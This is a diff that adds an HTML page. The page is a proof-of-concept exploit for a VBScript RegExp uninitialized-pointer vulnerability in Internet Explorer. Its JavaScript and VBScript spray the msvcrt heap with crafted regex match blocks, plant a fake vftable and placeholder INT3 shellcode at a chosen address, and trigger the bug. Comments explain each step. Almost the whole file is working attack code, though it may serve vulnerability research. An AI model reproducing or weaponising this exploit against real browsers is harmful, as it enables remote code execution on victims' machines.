@@ -1,0 +1,97 @@
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=10">
+    <script language="JavaScript">
+      function createRepeatedString(uSize, sString) {
+        var sRepeatedString = "";
+        var uLeftMostBit = 1 << (Math.ceil(Math.log(uSize+1) / Math.log(2)) - 1);
+        for (var uBit = uLeftMostBit; uBit > 0; uBit = uBit >>> 1) {
+          sRepeatedString += sRepeatedString;
+          if (uSize & uBit) sRepeatedString += sString;
+        }
+        return sRepeatedString;
+      }
+      function createDWordString(uValue) {
+        return String.fromCharCode(uValue & 0xFFFF, uValue >>> 16);
+      }
+      function createChunkWithDWords(uChunkSize, uValue) {
+        return createRepeatedString(uChunkSize / 4, createDWordString(uValue));
+      }
+      function setChunkDWord(sChunk, uOffset, uValue) {
+        if (uOffset & 1) throw new Error("uOffset (" + uOffset.toString(16) + ") must be Word aligned");
+        var uIndex = (uOffset % (sChunk.length * 2)) / 2;
+        return sChunk.substr(0, uIndex) + createDWordString(uValue) + sChunk.substr(uIndex + 2);
+      }
+      window.onload = function() {
+        // CRegExp::Execute can be made to use an uninitialized pointer to a CMatch object to call a virtual method of
+        // that object. In order to exploit this vulnerability, the exploit will try to prepare the heap such that the
+        // uninitialized pointer will contain a value under the exploit's control, allowing the exploit to control
+        // what gets execution.
+        // The uninitialized pointer is taken from a memory block containing 0x11 pointers (0x44 bytes on x86).
+        var uBlockSize = 0x44;
+        // This block is allocated on a heap used by msvcrt, so the exploit will allocate blocks of memory of the same
+        // size on the same heap, fill them with certain values and free them in order to prepare the heap. Commonly used
+        // ways of spraying the heap allocate memory blocks on another heap and are therefore not useful in this context.
+        // When a regular expression is executed and matches are found, a block of memory is allocated through msvcrt
+        // for each match. Each block will be used to store the start and end offset of the match in two DWords, as well
+        // as the start and end offset of each sub-match, also in two DWords (this is true for x86 and x64). Therefore,
+        // changing the number of sub-matches allows control over the size of the block, and changing the offset of the
+        // matches allows control over the values stored in the block. In short, the size of the block will be 8 bytes
+        // plus 8 bytes for each "()" in the expression. Since all blocks are rounded up to a multiple of 8 bytes, this
+        // can be used to allocate and fill blocks of the same size as the block that will contain the uninitialized
+        // pointer later.
+        // Successive matches will be at successive offsets, so the values stored in each allocated block will be
+        // increment by the length of the match. If the size of each match is 4 bytes, the value will increase by 4 in
+        // each successive block. For addresses pointing to a heap spray, this is acceptible.
+        var sMatchMarker = "PWND"; // This will be where the expression matches
+        var uRequiredSubMatches = Math.floor((uBlockSize + 7) / 8) - 1;
+        var sPattern = createRepeatedString(uRequiredSubMatches, "()") + sMatchMarker;
+        // The pattern will match at the marker, so a string with the same number of markers as the desired number of
+        // match objects will created that many match objects on the heap. 
+        var uMatchCount = 0x8001; // More is better :)
+        var sMatchesBuffer = createRepeatedString(uMatchCount, sMatchMarker);
+        // The memory blocks that the exploit will create will be filled with offsets of matches. To put the value X in a
+        // block, a match must be made after X characters. The exploit will need to fill the block with pointers to memory
+        // under its control, so the values it uses will be in the usual range for a heap spray. The values cannot be too
+        // large, as the string needed to create them would become so large that OOMs are likely to kill the exploit.
+        var uTargetAddress = 0x0a0a0000; // String needed to create this value will be twice as large!
+        var uVFTableOffset = 0x8000;
+        var uShellcodeOffset = 0x9000;
+        // Now spray the heap is to allocate memory at the target address.
+        var uChunkSize = 0x10000;
+        // Create a chunk with pointers to a fake vftable, a fake vftable and shellcode.
+        var sChunk = createChunkWithDWords(uChunkSize, uTargetAddress + uVFTableOffset);
+        // The fake vftable in the chunk should have a pointer for ::Release that points to our shellcode (no ROP
+        // or anything fancy: this is a PoC).
+        sChunk = setChunkDWord(sChunk, uTargetAddress + uVFTableOffset + 8, uTargetAddress + uShellcodeOffset);
+        // The shellcode is just a bunch of INT3s (again; this is a PoC sploit).
+        sChunk = setChunkDWord(sChunk, uTargetAddress + uShellcodeOffset, 0xCCCCCCCC);
+        var uChunkCount = uTargetAddress / uChunkSize * 2;
+        var uHeapHeaderSize = 0x10;
+        var uHeapFooterSize = 0x04;
+        var sBuffer = (
+          sChunk.substr(uHeapHeaderSize / 2) +    // Align chunk content with page boundary
+          createRepeatedString(uChunkCount - 2, sChunk) +
+          sChunk.substr(0, uHeapHeaderSize / 2) + // Allign matches with target address
+          sMatchesBuffer
+        );
+        // The regular expression is executed on the buffer to create "uBlockCount" blocks of "uBlockSize" bytes filled
+        // with dwords containing "uTargetAddress+N*4", where N is the number of the individual matches.
+        // We'll do this a number of times
+        sprayMSVCRTHeapAndTriggerVuln(sPattern, sBuffer);
+      }
+    </script>
+    <script language="VBScript">
+      Set oRegExp = New RegExp
+      oRegExp.Global = True
+      Sub sprayMSVCRTHeapAndTriggerVuln(sPattern, sBuffer)
+        ' Spray MSVCRT heap
+        oRegExp.Pattern = sPattern
+        oRegExp.Execute(sBuffer)
+        ' 17 matches are needed before an error (caused by an OOM) to trigger the vulnerable cleanup path.
+        oRegExp.Pattern = "A|()*?$"
+        oRegExp.Execute(String(17, "A") & "x")
+      End Sub
+    </script>
+  </head>
+</html>
